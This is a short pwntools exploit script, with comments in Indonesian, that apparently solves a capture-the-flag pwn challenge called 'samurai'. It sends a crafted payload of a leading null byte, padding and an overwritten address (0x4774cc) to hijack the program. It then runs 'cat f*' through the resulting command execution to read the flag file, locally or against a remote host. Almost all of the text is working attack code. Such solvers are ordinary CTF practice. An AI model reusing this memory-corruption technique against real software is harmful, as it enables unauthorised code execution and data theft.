from pwn import *
import sys
from Crypto.Util.number import long_to_bytes

context.binary = exe = ELF(f"./samurai", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def sendName(self, content):
        p = self.p
        p.sendline(content)
    
    def waitForName(self):
        p = self.p
        p.recvuntil(b"what was it again?")

def main():
    x, p = init()
    """
    karna pada source code ada baris seperti dibawah ini:

    strcpy(response + strlen(response) - 1, ".\n");

    kita harus membuat null-byte di awal, agar address yang ingin kita rubah,
    tidak ter-overwrite dengan newline.
    """
    pay = b"\x00"+b"A"*29
    pay += b"\xcc\x74\x47\x00"
    pay +=b"A"*2
    x.sendName(pay)
    x.debug("break *main+203\nc")
    x.waitForName()
    """
    
    char* finisher = malloc(8);
    
    kita hanya bisa mengirim sebanyak 8 byte,
    jadi kita menggunakan asterisk "*" untuk membaca flagnya
    """
    p.sendline(b"cat f*")
    p.interactive()
    
if __name__=="__main__":
    main()